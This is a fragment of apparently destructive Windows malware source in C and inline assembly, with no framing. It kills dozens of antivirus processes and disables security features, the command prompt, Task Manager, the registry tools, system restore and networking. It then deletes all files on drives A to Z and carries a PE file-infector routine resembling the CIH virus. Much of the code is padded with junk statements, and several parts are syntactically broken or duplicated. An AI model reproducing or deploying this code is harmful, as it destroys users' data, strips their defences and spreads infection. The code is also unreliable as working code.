		system("taskkill -im WinDefend.exe -f");
		cls;
		;
		system("taskkill -im SecHealthUI.exe -f");
		cls;
		;
		;
		;
		system("taskkill -im Windows Defender UI.exe -f");
		cls;
		;
		;
		;
		system("taskkill -im Mcshield.exe -f");
		cls;
		;
		;
		;
		system("taskkill -im Frameworkservice.exe -f");
		cls;
		;
		;
		;
		;
		system("taskkill -im NortonAntiVirus.exe -f");
		cls;
		;
		;
		;
		;
		system("taskkill -im RavMonD.exe -f");
		cls;//________________________
		;//
		;//
		;
		;
		;////////////////////////////--------------------___
		//////////////////
		system("taskkill -im RAVMOND.exe -f");
		cls;
		;
		system("taskkill -im ravmon.exe -f");
		cls;
		;
		system("taskkill -im rsrv.exe -f");
		cls;
		;
		;
		;
		;
		system("taskkill -im bdagent.exe -f");
		cls;
		;
		;
		system("taskkill -im bitdefender.exe -f");
		cls;
		;
		;
		;
		system("taskkill -im bdservicehost.exe -f");
		cls;
		;
		;
		system("taskkill -im egui.exe -f");
		cls;
		;
		;
		system("taskkill -im ekrn.exe -f");
		cls;
		;
		;
		system("taskkill -im eService.exe -f");
		cls;
		;
		;
		system("taskkill -im esettray.exe -f");
		cls;
		;
		;
		system("taskkill -im avira.exe -f");
		cls;
		;
		;
		system("taskkill -im avguard.exe -f");
		cls;
		;
		;
		system("taskkill -im avira.service.host.exe -f");
		cls;
		;
		;
		system("taskkill -im Tmcc.exe -f");
		cls;
		;
		;
		system("taskkill -im Tmntsrv.exe -f");
		cls;
		;
		;
		system("taskkill -im TmPfw.exe -f");
		cls;
		;
		;
		system("taskkill -im PandaUI.exe -f");
		cls;
		;
		;
		system("taskkill -im PandaService.exe -f");
		cls;
		;/////////////fghnkni
		/////fgjhuuyhyi6uy6dfuhrgbm236i5fyj466t1n
		system("taskkill -im PandaShield.exe -f");
		cls;
		;
		;
		system("taskkill -im mbam.exe -f");
		cls;
		;
		;
		system("taskkill -im mbamservice.exe -f");
		cls;
		;
		;
		//////////////
		system("taskkill -im mbamtray.exe -f");
		cls;
		;
		;
		system("taskkill -im totalav.exe -f");
		cls;
		;
		;
		system("taskkill -im totalav.service.exe -f");
		cls;
		;
		system("taskkill -im SophosUI.exe -f");
		cls;
		;
		;
		system("taskkill -im SophosService.exe -f");
		cls;
		;
		;
		system("taskkill -im SophosWebProtection.exe -f");
		cls;
		;
		;
		system("taskkill -im kxetray.exe -f");
		cls;
		;
		;
		system("taskkill -im Kxescore.exe -f");
		cls;
		;
		;
		system("taskkill -im KAVStart.exe -f");
		cls;
		;
		;
		system("taskkill -im KWatch.exe -f");
		cls;
		;
		;
		system("taskkill -im KWatchX.exe -f");
		cls;
		;
		;
		system("taskkill -im KAV32.exe -f");
		cls;
		;
		;
		system("taskkill -im KAV64.exe -f");
		cls;
		;
		;
		system("taskkill -im KPFW32.exe -f");
		cls;
		;
		;
		system("taskkill -im KPFW64.exe -f");
		cls;
		;
		;
		system("taskkill -im KPFWtray.exe -f");
		cls;
		;
		;
		system("taskkill -im KMailMon.exe -f");
		cls;
		;
		;
		system("taskkill -im KUpdate.exe -f");
		cls;
		;
		;
		system("taskkill -im KUpdate.BIN -f");
		cls;
		;
		;
		system("taskkill -im ksafe.exe -f");
		cls;
		;
		;
		system("taskkill -im KSafeTray.exe -f");
		cls;
		;
		;
		system("taskkill -im KSafeService.exe -f");
		cls;
		;
		;
		system("taskkill -im kvsrvxp.exe -f");
		cls;
		;
		;
		system("taskkill -im kvsrv64.exe -f");
		cls;
		;
		;
		system("taskkill -im KVMonXP.exe -f");
		cls;
		;
		;
		system("taskkill -im KVMon64.exe -f");
		cls;
		;
		;
		system("taskkill -im KVTray.exe -f");
		cls;
		;
		;
		system("taskkill -im kvnative.exe -f");
		cls;
		;
		;
		system("taskkill -im KVUpdater.exe -f");
		cls;
		system("taskkill -im BaiduSd.exe -f");
		cls;
		;
		;
		system("taskkill -im BaiduSdSvc.exe -f");
		cls;
		system("taskkill -im BaiduSdTray.exe -f");
		cls;
		;
		;
		system("taskkill -im BavSvc.exe -f");
		cls;
		;
		;
		system("taskkill -im BavTray.exe -f");
		cls;
		system("taskkill -im bavmsservice.exe -f");
		cls;
		;
		;
		system("taskkill -im nprotect.exe -f");
		cls;
		;
		;
		system("taskkill -im nspupsvc.exe -f");
		cls;
		;
		;
		system("taskkill -im nprotectsvc.exe -f");
		cls;
		system("taskkill -im VRV.exe -f");
		cls;
		;
		;
		;
		;
		system("taskkill -im VrvArp.exe -f");
		cls;
		system("taskkill -im JingYunSvc.exe -f");
		cls;
		system("taskkill -im JingYunTray.exe -f");
		cls;
		system("taskkill -im FYAntivirus.exe -f");
		cls;
		system("taskkill -im FYFireWall.exe -f");
		cls;
		system("taskkill -im FYService.exe -f");
		cls;
		system("taskkill -im nortonsecurity.exe -f");
		cls;
		system("taskkill -im ccSvcHst.exe -f");
		cls;
		/////////
		system("taskkill -im SymEFASI.exe -f");
		cls;
		system("taskkill -im nsTray.exe -f");
		cls;
		system("taskkill -im mcafee.exe -f");
		cls;
		system("taskkill -im McAfeeUI.exe -f");
		cls;
		system("taskkill -im mfemms.exe -f");
		cls;
		system("taskkill -im mfevtps.exe -f");
		cls;
		system("taskkill -im mcafee.tray.exe -f");
		cls;
		system("taskkill -im gdlauncher.exe -f");
		cls;
		system("taskkill -im gddservice.exe -f");
		cls;/////////////////////////////////
		system("taskkill -im gdfire.exe -f");
		cls;/////////////////////////////////
		////////////////////////////////////
		system("taskkill -im gdtray.exe -f");
		cls;
		{
			//////////
		}
		{
			////////
		}
		system("taskkill -im QuickHeal.exe -f");
		cls;
		{
			;
			;
			;
		}
		system("taskkill -im QHSvc.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im QHTray.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im QHShield.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im K7TS.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im K7Service.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im K7Tray.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im AvastUI.exe -f");
		cls;
		system("taskkill -im AvastSvc.exe -f");
		cls;
		system("taskkill -im ashServ.exe -f");
		cls;
		system("taskkill -im ashDisp.exe -f");
		cls;
		system("taskkill -im avgui.exe -f");
		cls;
		system("taskkill -im avgcsrva.exe -f");
		cls;
		system("taskkill -im avgmfapx.exe -f");
		cls;
		system("taskkill -im avgtray.exe -f");
		cls;
		system("taskkill -im gdlauncher.exe -f");
		cls;
		system("taskkill -im gddservice.exe -f");
		cls;
		system("taskkill -im fsgui.exe -f");
		cls;
		system("taskkill -im fssvc.exe -f");
		cls;
		system("taskkill -im fsshield.exe -f");
		cls;
		system("taskkill -im fstray.exe -f");
		cls;
		system("taskkill -im wrsa.exe -f");
		cls;
		system("taskkill -im wrsservice.exe -f");
		cls;
		system("taskkill -im wrstray.exe -f");
		cls;
		system("taskkill -im malwarebytes.exe -f");
		cls;
		system("taskkill -im mbamservice.exe -f");
		cls;
		system("taskkill -im mbamtray.exe -f");
		cls;
		system("taskkill -im mbamchameleon.exe -f");
		cls;
		system("taskkill -im tmntsrv.exe -f");
		cls;
		system("taskkill -im trendmicro.exe -f");
		cls;
		system("taskkill -im tmtray.exe -f");
		cls;
		system("taskkill -im tmusa.exe -f");
		cls;
		system("taskkill -im tmproxy.exe -f");
		cls;
		system("taskkill -im PSUAMain.exe -f");
		cls;
		system("taskkill -im PSANHost.exe -f");
		cls;
		system("taskkill -im PandaTray.exe -f");
		cls;
		system("taskkill -im pskmad.sys -f");
		cls;
		system("taskkill -im PandaUpdate.exe -f");
		cls;
		system("taskkill -im cis.exe -f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("taskkill -im cmdagent.exe -f");
		cls;
		system("taskkill -im cmtray.exe -f");
		cls;
		system("taskkill -im cfp.exe -f");
		cls;
		system("taskkill -im sandboxie.dll -f");
		cls;
		system("taskkill -im SophosUI.exe -f");
		cls;
		system("taskkill -im SophosService.exe -f");
		cls;
		system("taskkill -im SophosTray.exe -f");
		cls;
		system("taskkill -im SophosUpdate.exe -f");
		cls;
		system("taskkill -im SophosFirewall.exe -f");
		cls;
		system("taskkill -im TotalAV.exe -f");
		cls;
		system("taskkill -im TotalAVService.exe -f");
		cls;
		system("taskkill -im TotalAVTray.exe -f");
		cls;
		system("taskkill -im TotalAVUpdate.exe -f");
		cls;
		system("taskkill -im TotalAVVPN.exe -f");
		cls;
		system("taskkill -im a2guard.exe -f");
		cls;
		system("taskkill -im a2start.exe -f");
		cls;
		system("taskkill -im a2tray.exe -f");
		cls;
		system("taskkill -im a2service.exe -f");
		cls;
		system("taskkill -im a2update.exe -f");
		cls;
		system("taskkill -im IMF.exe -f");
		cls;
		system("taskkill -im IMFTray.exe -f");
		cls;
		system("taskkill -im IMFFirewall.exe -f");
		cls;
		;
		system("taskkill -im Dism++主程序.exe -f");
		cls;
		if (0)
		{
			;
		}
		else
		{
			;
		}
		system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity /v Enabled /t REG_DWORD /d 0 /f");
		cls;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /f");
		cls;
		int i;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /f");
		cls;
		{
			;
			;
		}
		i = 36596886754;
		{

		}
		i = 63;
		system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /f");
		cls;
		system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
		cls;
		;
		;
		;
		;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
		cls;
		if(true)
		{
			if (0)
			{
				;
				;
				;
				;
				int f=56;
			}
			;
			{
				;
			}
			;
			;
			;
		}
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoClose /t REG_DWORD /d 1 /f");
		cls;
		;
		;
		;
		;
		;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f");
		cls;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDrives /t REG_DWORD /d 4294967295 /f");
		cls;
		;
		;
		;
		{
			;
		}
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
		cls;
		i=7;
		cls;
		cls;
		cls;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f");
		cls;
		;
		;
		;
		;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoViewOnDrive /t REG_DWORD /d 4294967295 /f");
		cls;
		{
			;
		}
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFind /t REG_DWORD /d 1 /f");
		cls;
		{
			;
			;
			;
		}
		system("taskkill -im wscript.exe -f");
		cls;
		{
			;
		}
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v RestrictRun /t REG_DWORD /d 1 /f");
		cls;
		;
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f");
		cls;
		{
			;
			;
		}
		system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
		cls;
		{
			;
		}
		system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows Script Host\\Settings /v Enabled /t REG_DWORD /d 0 /f");
		cls;
		;
		;
		;
		;
		system("reg add HKLM\\SOFTWARE\\Classes\\.vbs /v PerceivedType /d txt /f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		;
		;
		system("reg add HKLM\\SOFTWARE\\Classes\\.js /v PerceivedType /d txt /f");
		cls;
		;
		;
		;
		;
		;
		;
		;
		system("reg add HKLM\\SOFTWARE\\Classes\\.html /v PerceivedType /d txt /f");
		cls;
		;
		;
		;
		;
		;
		system("reg add HKLM\\SOFTWARE\\Classes\\.mhtml /v PerceivedType /d txt /f");
		cls;
		;
		;
		;
		;
		;
		;
		system("reg add HKLM\\SOFTWARE\\Classes\\.htm /v PerceivedType /d txt /f");
		cls;
		system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\storahci /v Start /t REG_DWORD /d 4 /f");
		cls;
		system("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services" /f");
		cls;
		system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f");
		cls;
		system("for /f tokens=3* %a in ('netsh interface show interface ^| find 已连接') do netsh interface set interface %b admin=disable");
		if(1)
		{
			cls;
		}
		srand(time(NULL));

		for (int i = 0; i < 20; i++) {
			SetCursorPos(rand()%SMX,rand()%SMY);
			Sleep(500);
			SetCursorPos(1,1);
			Sleep(500);
			InvertScreen();
			Sleep(500);
			GlitchScreen();
			Sleep(500);
			ShakeScreen();
			Sleep(500);
			GradientScreen();
			Sleep(500);
			BlurScreen();
			Sleep(500);
			FlickerScreen();
			Sleep(500);
			BlackAndWhiteScreen();
			Sleep(500);
			SnowScreen();
			Sleep(500);
			ShowNotification();
			Sleep(1000);
		}
		system("taskkill -im explorer.exe -f");
		cls;
		;
		system("taskkill -im dwm.exe -f");
		cls;
		{
			int a=6;
			int b=4;
			int c=7;
			int b=a;
			int a=c;
			int c=b;
			int b=a;
		}
		system("del Z:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		;
		system("del Y:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del X:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del W:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del V:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del U:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		;
		;
		system("del T:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		;
		;
		system("del S:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del R:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del Q:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del P:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del O:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del N:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del M:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del L:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del K:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del J:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del I:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del H:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del G:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del F:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del E:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del D:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del B:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del A:\\* /f /s /q");
		cls;
		;
		;
		;
		;
		system("del C:\\* /f /s /q");
		cls;

		#endif

		{
			PE_HEADER *pe;
			DWORD q, eiRVA, last_sect;
			LPBYTE peadr;

			DWORD a0=(DWORD)MainThread;
			DWORD a =(DWORD)MainThread>>16;
			a=a<<16;
			a = FindPEheader(a, a0, 4, &pe);

			eiRVA = pe->importrva;

			for (q = 0; q < pe->importsize; q += SZIDTE)
			{
				IMPORT_DIRECTORY_TABLE_ENTRY *idte=(LPVOID)(a+eiRVA+q);

				if (idte->ImportLookUp==0) break;
				if (_KERNEL32 != NULL) break;

				ProcessDLLimports(a, idte);
			}

			if (_KERNEL32 == NULL) return;


			#ifdef RUNLINE

			#ifdef EXEFILE
			adddeb("Decrypt MainThread addr:%X size:%X",MainThread,MainThread_size);
			#endif

			{
				unsigned char *bb=MainThread;
				DWORD i=0;
				for (q = 0; q < MainThread_size; q++)
				{ bb[q]=bb[q]^MainThread_key[i]; i++; if (i==4) i=0; }

				#ifdef EXEFILE
				adddeb("Decrypted OK");
				#endif
			}

			#endif
			StartMainThread();


			szinfcode=WriteOrGetLen_C_CODE(NULL, NULL, 0, 0);


			last_sect = pe->numofobjects - 1;
			peadr = pe;

			#ifdef EXEFILE
			loop:; sleep(0); goto loop;
			#endif
			#ifndef EXEFILE
			{
				DWORD q=0;
				DWORD old_prot;
				BYTE b;
				unsigned char *ep_code;
				PE_OBJENTRY *lastsect =peadr+SZPE+SZOBJE*last_sect;
				upx_sect = (LPSTR)(pe->imagebase + lastsect->virtrva);
				my_strcpy(SECTNAME,lastsect->name);
				SECTNAME[8]=0;
				ep_code   = (LPSTR)(pe->imagebase + GetVictimEP());

				upx_sect=(LPSTR)fool_drweb((DWORD)upx_sect);
				_VirtualProtect(ep_code, szinfcode, PAGE_EXECUTE_READWRITE, &old_prot);

				next:;
				{
					DWORD antinorm2_trash, antinorm1_trash=555;
					b = upx_sect[q];
					ep_code[q]=b;
					antinorm2_trash=666;
					q++;
				}
				if (q < szinfcode) goto next;
			}
			#ifdef _MSC_VER
			_asm
			{
				_emit 0xC9
				_emit 0x61
				_emit 0xE9; _emit 0x00; _emit 0x00; _emit 0x00; _emit 0x00
			}
			#else
			_asm
			(
				".byte 0xC9                      \n"
				".byte 0x61                      \n"
				".byte 0xE9,0x00,0x00,0x00,0x00  \n"
				".byte 0xC3                      \n"
			);
			#endif

			#endif
		}

		#ifdef _MSC_VER
		#pragma optimize("", off)
		#else
		#pragma optimize(off)
		#endif

		_asm{
			.586
			OriginalAppEXE SEGMENT
			FileHeader:
			db 04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000h
			db 004h, 000h, 000h, 000h, 0ffh, 0ffh, 000h, 000h
			db 0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 040h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 080h, 000h, 000h, 000h
			db 00eh, 01fh, 0bah, 00eh, 000h, 0b4h, 009h, 0cdh
			db 021h, 0b8h, 001h, 04ch, 0cdh, 021h, 054h, 068h
			db 069h, 073h, 020h, 070h, 072h, 06fh, 067h, 072h
			db 061h, 06dh, 020h, 063h, 061h, 06eh, 06eh, 06fh
			db 074h, 020h, 062h, 065h, 020h, 072h, 075h, 06eh
			db 020h, 069h, 06eh, 020h, 044h, 04fh, 053h, 020h
			db 06dh, 06fh, 064h, 065h, 02eh, 00dh, 00dh, 00ah
			db 024h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 050h, 045h, 000h, 000h, 04ch, 001h, 001h, 000h
			db 0f1h, 068h, 020h, 035h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 0e0h, 000h, 00fh, 001h
			db 00bh, 001h, 005h, 000h, 000h, 010h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 010h, 010h, 000h, 000h, 000h, 010h, 000h, 000h
			db 000h, 020h, 000h, 000h, 000h, 000h, 040h, 000h
			db 000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h
			db 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 020h, 000h, 000h, 000h, 002h, 000h, 000h
			db 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
			db 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
			db 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
			db 000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			db 0c3h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
			dd 00000000h, VirusSize
			OriginalAppEXE ENDS
			TRUE = 1
			FALSE = 0
			DEBUG = TRUE
			IF DEBUG
			FirstKillHardDiskNumber = 82h
			HookExceptionNumber = 06h
			ELSE
			FirstKillHardDiskNumber = 81h
			HookExceptionNumber = 04h
			ENDIF
			FileNameBufferSize = 7fh
			VirusGame SEGMENT
			ASSUME CS:VirusGame, DS:VirusGame, SS:VirusGame
			ASSUME ES:VirusGame, FS:VirusGame, GS:VirusGame
			MyVirusStart:
			push ebp
			lea eax, [esp-04h2]
			xor ebx, ebx
			xchg eax, fs:[ebx]
			call @0
			@0:
			pop ebx
			lea ecx, StopToRunVirusCode-@0[ebx]
			push ecx
			push eax
			push eax
			sidt [esp-02h]
			pop ebx
			add ebx, HookExceptionNumber08h+04h
			cli
			mov ebp, [ebx]
			mov bp, [ebx-04h]
			lea esi, MyExceptionHook-@1[ecx]
			push esi
			mov [ebx-04h], si
			shr esi, 16
			mov [ebx+02h], si
			pop esi
			int HookExceptionNumber
			ReturnAddressOfEndException:
			push esi
			mov ecx, dr0
			jecxz AllocateSystemMemoryPage
			add dword ptr [esp], ReadyRestoreSE-ReturnAddressOfEndException
			mov [ebx-04h], bp
			shr ebp, 16
			mov [ebx+02h], bp
			pop esi
			jmp ExitRing0Init
			AllocateSystemMemoryPage:
			mov dr0, ebx
			push 00000000fh
			push ecx
			push 0ffffffffh
			push ecx
			push ecx
			push ecx
			push 000000001h
			push 000000002h
			int 20h
			_PageAllocate = dd 00010053h
			mov dr0, eax
			pop eax
			lea eax, InstallFileSystemApiHook-@3[eax]
			mov [ecx], eax
			cli
			jmp ExitRing0Init
			CodeSizeOfMergeVirusCodeSection = offset
			InstallMyFileSystemApiHook:
			lea eax, FileSystemApiHook-@6[edi]
			push eax
			push 00000000fh
			push ecx
			push 0ffffffffh
			push ecx
			push ecx
			push ecx
			push 000000001h
			push 000000002h
			int 20h
			_VXDCall IFSMgr_InstallFileSystemApiHook = dd 00400067h
			pop eax
			push dword ptr [esp+8]
			call OldInstallFileSystemApiHook-@3[ebx]
			pop ecx
			push eax
			push ebx
			call OldInstallFileSystemApiHook-@3[ebx]
			pop ecx
			mov dr0, eax
			pop eax
			pop ebx
			ret
			OldInstallFileSystemApiHook dd ?
			FileSystemApiHook:
			@3 = FileSystemApiHook
			pushad
			call @5
			@5:
			pop esi
			add esi, VirusGameDataStartAddress-@5
			test byte ptr (OnBusy-@6)[esi], 01h
			jnz pIFSFunc
			lea ebx, [esp+20h+04h+04h]
			cmp dword ptr [ebx], 00000024h
			jne prevhook
			inc byte ptr (OnBusy-@6)[esi]
			add esi, FileNameBuffer-@6
			push esi
			mov al, [ebx+04h]
			cmp al, 0ffh
			je CallUniToBCSPath
			add al, 40h
			mov ah, ':'
		mov [esi], eax
		inc esi
		inc esi
		CallUniToBCSPath:
		push 00000000h
		push FileNameBufferSize
		mov ebx, [ebx+10h]
		mov eax, [ebx+0ch]
		add eax, 04h
		push eax
		push esi
		int 20h
		_UniToBCSPath = dd 00400041h
		cmp [esi+eax-04h], 'EXE.'
		jne DisableOnBusy
		cmp [esi+eax-06h], 'KCU'
		jne DisableOnBusy
		cmp word ptr [ebx+18h], 01h
		jne DisableOnBusy
		push ecx
		mov edi, dword ptr (IFSMgr_Ring0_FileIO-@7)[esi]
		mov edi, [edi]
		test cl, 01h
		jz OpenFile
		mov ax, 4301h
		xor ecx, ecx
		call edi
		OpenFile:
		xor eax, eax
		mov ah, 0d5h
		xor ecx, ecx
		xor edx, edx
		inc edx
		mov ebx, edx
		inc ebx
		call edi
		xchg ebx, eax
		pop ecx
		pushf
		test cl, 01h
		jz IsOpenFileOK
		mov ax, 4301h
		call edi
		IsOpenFileOK:
		popf
		jc DisableOnBusy
		push esi
		pushf
		add esi, DataBuffer-@7
		xor eax, eax
		mov ah, 0d6h
		mov ebp, eax
		push 00000004h
		pop ecx
		push 0000003ch
		pop edx
		call edi
		mov edx, [esi]
		dec edx
		mov eax, ebp
		call edi
		cmp dword ptr [esi], 00455000h
		jne CloseFile
		mov eax, 4300h
		int 20h
		push ecx
		mov edi, dword ptr (IFSMgr_Ring0_FileIO-@7)[esi]
		mov edi, [edi]
		test cl, 01h
		jz OpenFile
		mov ax, 4301h
		xor ecx, ecx
		call edi
		OpenFile:
		xor eax, eax
		mov ah, 0d5h
		xor ecx, ecx
		xor edx, edx
		inc edx
		mov ebx, edx
		inc ebx
		call edi
		xchg ebx, eax
		pop ecx
		pushf
		test cl, 01h
		jz IsOpenFileOK
		mov ax, 4301h
		call edi
		IsOpenFileOK:
		popf
		jc DisableOnBusy
		push esi
		pushf
		add esi, DataBuffer-@7
		xor eax, eax
		mov ah, 0d6h
		mov ebp, eax
		push 00000004h
		pop ecx
		push 0000003ch
		pop edx
		call edi
		mov edx, [esi]
		dec edx
		mov eax, ebp
		call edi
		cmp dword ptr [esi], 00455000h
		jne CloseFile
		mov eax, ebp
		mov cl, SizeOfImageHeaderToRead
		add edx, 07h
		call edi
		lea eax, (AddressOfEntryPoint-@8)[edx]
		push eax
		lea eax, (NewAddressOfEntryPoint-@8)[esi]
		push eax
		movzx eax, word ptr (SizeOfOptionalHeader-@8)[esi]
		lea edx, [eax+edx+12h]
		mov al, SizeOfScetionTable
		mov cl, (NumberOfSections-@8)[esi]
		mul cl
		lea esi, (StartOfSectionTable-@8)[esi]
		push eax
		push edx
		push esi
		inc ecx
		push ecx
		shl ecx, 03h
		push ecx
		add ecx, eax
		add ecx, edx
		sub ecx, (SizeOfHeaders-@9)[esi]
		not ecx
		inc ecx
		push ecx
		xchg ecx, eax
		mov eax, (AddressOfEntryPoint-@9)[esi]
		add eax, (ImageBase-@9)[esi]
		mov (OriginalAddressOfEntryPoint-@9)[esi], eax
		cmp word ptr [esp], CodeSizeOfMergeVirusCodeSection
		jl OnlySetInfectedMark
		mov eax, ebp
		call edi
		xchg eax, ebp
		push 00000004h
		pop ecx
		push edx
		mov edx, (SizeOfScetionTable+PointerToRawData-@9)[esi]
		add edx, 12h
		call edi
		cmp dword ptr [esi], 'piZniW'
		je NotSetInfectedMark
		pop edx
		pop ebx
		pop edi
		pop ecx
		push edi
		add edx, ebp
		push edx
		add ebp, esi
		push ebp
		lea eax, [ebp+edi-04h]
		mov [eax], ebx
		push ebx
		add edx, edi
		push edx
		lea edi, (MyVirusStart-@9)[esi]
		push edi
		mov (NewAddressOfEntryPoint-@9)[esi], edx
		lea edx, [esi-SizeOfScetionTable]
		mov ebp, offset VirusSize
		jmp StartToWriteCodeToSections
		LoopOfWriteCodeToSections:
		add edx, SizeOfScetionTable
		mov ebx, (SizeOfRawData-@9)[edx]
		sub ebx, (VirtualSize-@9)[edx]
		jbe EndOfWriteCodeToSections
		push ebx
		sub eax, 08h
		mov [eax], ebx
		mov ebx, (PointerToRawData-@9)[edx]
		add ebx, (VirtualSize-@9)[edx]
		push ebx
		push edi
		mov ebx, (VirtualSize-@9)[edx]
		add ebx, (VirtualAddress-@9)[edx]
		add ebx, (ImageBase-@9)[esi]
		mov [eax+4], ebx
		mov ebx, [eax]
		add (VirtualSize-@9)[edx], ebx
		or (Characteristics-@9)[edx], 40000040h
		StartToWriteCodeToSections:
		sub ebp, ebx
		jbe SetVirusCodeSectionTableEndMark
		add edi, ebx
		EndOfWriteCodeToSections:
		loop LoopOfWriteCodeToSections
		OnlySetInfectedMark:
		mov esp, dr1
		jmp WriteVirusCodeToFile
		NotSetInfectedMark:
		add esp, 3ch
		jmp CloseFile
